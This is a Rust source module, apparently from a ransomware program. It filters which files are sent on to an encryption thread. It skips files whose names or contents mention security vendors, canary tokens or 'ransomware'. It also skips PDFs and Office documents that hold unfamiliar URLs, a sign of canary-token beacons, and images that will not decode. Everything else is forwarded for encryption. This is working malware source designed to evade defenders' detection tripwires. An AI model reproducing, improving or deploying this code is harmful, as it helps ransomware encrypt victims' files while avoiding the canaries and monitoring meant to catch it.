use flume::{Receiver, Sender};
use log::{debug, error, info};
use regex::Regex;
use std::{
    io::{Cursor, Read},
    path::{Path, PathBuf},
    sync::{Arc, LazyLock},
    thread,
};
use zip::read::ZipArchive;

use crate::{client::recv_path, config, img::img_from_bytes};
use coconut_crab_lib::file::get_file_data;

static INTERESTING_STRING_REGEX: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[A-Za-z0-9:./-]{6,}").expect("Invalid Regex"));
static LOOSE_URL_REGEX: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"https?://(?:[^.]+\.+)*([^.]+\.[^./]+)").expect("Invalid Regex"));
static SUSPICIOUS_KEYWORDS: LazyLock<[String; 9]> = LazyLock::new(|| {
    [
        lc!("canary"),
        lc!("canaries"),
        lc!("huntress"),
        lc!("exampleit"),
        lc!("splunk"),
        lc!("stressboi"),
        lc!("james brodsky"),
        lc!("ransomware"),
        lc!("nccgroup"),
    ]
});

const OFFICE_FILE_DOMAINS: [&str; 4] =
    ["microsoft.com", "openxmlformats.org", "w3.org", "purl.org"];
const OFFICE_ZIP_EXTENSIONS: [&str; 4] = ["zip", "docx", "xlsx", "pptx"];
const IMAGE_EXTENSIONS: [&str; 17] = [
    "avif", "bmp", "dds", "ff", "gif", "hdr", "ico", "jpg", "jpeg", "exr", "png", "pnm", "qoi",
    "tga", "tiff", "tif", "webp",
];
const MAX_IMAGE_SIZE_BYTES: u64 = 2 * 1024 * 1024;
const MAX_FILE_SIZE_BYTES: u64 = 1024 * 1024;
const MAX_ZIP_ENTRIES: usize = 4096;
const MAX_ZIP_TOTAL_BYTES: u64 = 8 * 1024 * 1024;

pub const fn canary_active() -> bool {
    config::ANALYZE_PDF || config::ANALYZE_OFFICE_ZIP || config::AVOID_BROKEN_IMAGES
}

#[derive(Debug)]
struct ZipAnalysisError(String);

impl std::fmt::Display for ZipAnalysisError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl std::error::Error for ZipAnalysisError {}

pub fn filter_canary(
    receiver: Receiver<Arc<PathBuf>>,
    sender: Sender<Arc<PathBuf>>,
) -> thread::JoinHandle<()> {
    debug!("Starting canary filter thread");
    thread::spawn(move || {
        loop {
            let Some(file_path) = recv_path(&receiver) else {
                return;
            };

            if config::AVOID_KEYWORDS && analyze_keywords(&file_path.to_string_lossy()) {
                info!("File path contained keyword: {file_path:?}");
                continue;
            }

            let ext = file_path
                .extension()
                .and_then(|e| e.to_str())
                .unwrap_or_default();
            let is_pdf = ext.eq_ignore_ascii_case("pdf");
            let is_office_zip = OFFICE_ZIP_EXTENSIONS
                .iter()
                .any(|allowed| ext.eq_ignore_ascii_case(allowed));
            let is_image = IMAGE_EXTENSIONS
                .iter()
                .any(|allowed| ext.eq_ignore_ascii_case(allowed));
            if config::ANALYZE_PDF && is_pdf {
                filter_pdf(&sender, &file_path);
            } else if config::ANALYZE_OFFICE_ZIP && is_office_zip {
                filter_office_zip(&sender, &file_path);
            } else if config::AVOID_BROKEN_IMAGES && is_image {
                filter_broken_image(&sender, &file_path);
            } else {
                forward(&sender, &file_path, "no analysis applicable");
            }
        }
    })
}

fn forward(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>, reason: &str) {
    debug!("Forwarding for encryption ({reason}): {file_path:?}");
    if let Err(error) = sender.send(Arc::clone(file_path)) {
        error!("Failed to send path to encryption thread: {error}");
    }
}

fn read_capped_or_forward(
    sender: &Sender<Arc<PathBuf>>,
    file_path: &Arc<PathBuf>,
    max_size: u64,
    unreadable_reason: &str,
    oversize_reason: &str,
) -> Option<Vec<u8>> {
    match get_file_data(file_path.as_ref(), max_size) {
        Ok(Some(data)) => Some(data),
        Ok(None) => {
            forward(sender, file_path, oversize_reason);
            None
        }
        Err(error) => {
            error!("Error during file data retrieval: {error:?}");
            forward(sender, file_path, unreadable_reason);
            None
        }
    }
}

fn filter_pdf(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>) {
    let Some(file_data) = read_capped_or_forward(
        sender,
        file_path,
        MAX_FILE_SIZE_BYTES,
        "unreadable pdf",
        "oversize pdf",
    ) else {
        return;
    };

    if analyze_file_data(&file_data, config::AVOID_KEYWORDS, config::AVOID_URLS) {
        info!("File flagged by analysis. Not sending file for encryption: {file_path:?}");
    } else {
        forward(sender, file_path, "clean pdf");
    }
}

fn filter_office_zip(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>) {
    let Some(data) = read_capped_or_forward(
        sender,
        file_path,
        MAX_FILE_SIZE_BYTES,
        "unreadable zip",
        "oversize zip",
    ) else {
        return;
    };

    match analyze_zip_bytes(
        &data,
        file_path.as_ref(),
        MAX_FILE_SIZE_BYTES,
        config::AVOID_KEYWORDS,
        config::AVOID_URLS,
    ) {
        Ok(true) => {
            info!("File flagged by analysis. Not sending file for encryption: {file_path:?}");
        }
        Ok(false) => {
            forward(sender, file_path, "clean zip");
        }
        Err(error) => {
            error!("Error analyzing zip file: {error}");
            forward(sender, file_path, "unanalyzable zip");
        }
    }
}

fn filter_broken_image(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>) {
    let Some(file_data) = read_capped_or_forward(
        sender,
        file_path,
        MAX_IMAGE_SIZE_BYTES,
        "unreadable image",
        "oversize image",
    ) else {
        return;
    };

    if img_from_bytes(&file_data).is_ok() {
        forward(sender, file_path, "decodable image");
    } else {
        info!("Not sending file for encryption: {file_path:?}");
    }
}

fn analyze_file_data(file_data: &[u8], avoid_keywords: bool, avoid_urls: bool) -> bool {
    let lowered = String::from_utf8_lossy(file_data).to_ascii_lowercase();
    INTERESTING_STRING_REGEX.find_iter(&lowered).any(|m| {
        let interesting_string = m.as_str();
        (avoid_keywords && contains_suspicious_keyword_lowered(interesting_string))
            || (avoid_urls && analyze_urls(interesting_string))
    })
}

fn contains_suspicious_keyword_lowered(lowered: &str) -> bool {
    SUSPICIOUS_KEYWORDS
        .iter()
        .any(|keyword| lowered.contains(keyword.as_str()))
}

fn analyze_keywords(string: &str) -> bool {
    let lowered = string.to_ascii_lowercase();
    if contains_suspicious_keyword_lowered(&lowered) {
        info!("String flagged by analysis due to keyword");
        return true;
    }
    debug!("String not flagged by analysis: {string}");
    false
}

fn analyze_urls(string: &str) -> bool {
    for (_url, [domain]) in LOOSE_URL_REGEX
        .captures_iter(string)
        .map(|regex_capture| regex_capture.extract())
    {
        if analyze_domain(domain) {
            info!("URL flagged by analysis due to domain: {domain}");
            return true;
        }
    }
    debug!("URL not flagged by analysis");
    false
}

fn analyze_domain(domain: &str) -> bool {
    if !OFFICE_FILE_DOMAINS.contains(&domain) {
        debug!("Domain not a known office document domain: {domain}");
        return true;
    }
    debug!("Domain is a known office document domain: {domain}");
    false
}

fn analyze_zip_bytes(
    data: &[u8],
    file_path: &Path,
    zipped_file_max_size: u64,
    avoid_keywords: bool,
    avoid_urls: bool,
) -> Result<bool, ZipAnalysisError> {
    let mut archive = ZipArchive::new(Cursor::new(data)).map_err(|error| {
        error!("Error opening file as zip archive: {error:?}");
        ZipAnalysisError(error.to_string())
    })?;

    debug!("Zip archive contains {} files", archive.len());
    if archive.len() > MAX_ZIP_ENTRIES {
        debug!(
            "Truncating zip analysis to first {MAX_ZIP_ENTRIES} of {} entries: {}",
            archive.len(),
            file_path.display()
        );
    }
    let mut total_analyzed: u64 = 0;
    for zipped_file_num in 0..archive.len().min(MAX_ZIP_ENTRIES) {
        if total_analyzed >= MAX_ZIP_TOTAL_BYTES {
            debug!(
                "Zip analysis total budget ({MAX_ZIP_TOTAL_BYTES}) reached, stopping fail-open: {}",
                file_path.display()
            );
            break;
        }
        let mut entry = archive.by_index(zipped_file_num).map_err(|error| {
            error!("Error opening zipped file: {error:?}");
            ZipAnalysisError(error.to_string())
        })?;

        if entry.size() <= zipped_file_max_size {
            debug!(
                "Entry size ({}) is below max analysis size ({})",
                entry.size(),
                zipped_file_max_size
            );

            let prealloc = entry.size().min(zipped_file_max_size);
            let mut zipped_file_data = Vec::with_capacity(usize::try_from(prealloc).unwrap_or(0));
            entry
                .by_ref()
                .take(zipped_file_max_size + 1)
                .read_to_end(&mut zipped_file_data)
                .map_err(|error| {
                    error!("Error reading zipped file: {error}");
                    ZipAnalysisError(error.to_string())
                })?;
            debug!(
                "Successfully read {} bytes from zipped file: {}",
                zipped_file_data.len(),
                entry.name()
            );

            if u64::try_from(zipped_file_data.len()).is_ok_and(|len| len > zipped_file_max_size) {
                debug!(
                    "Entry decompressed beyond max size ({}), skipping: {}",
                    zipped_file_data.len(),
                    entry.name()
                );
                continue;
            }
            total_analyzed += zipped_file_data.len() as u64;

            if analyze_file_data(&zipped_file_data, avoid_keywords, avoid_urls) {
                info!("Zipped file flagged by analysis: {}", entry.name());
                return Ok(true);
            }
        } else {
            debug!(
                "Entry size ({}) is above max analysis size ({})",
                entry.size(),
                zipped_file_max_size
            );
        }
    }
    debug!(
        "Zip archive not flagged by analysis: {}",
        file_path.display()
    );
    Ok(false)
}
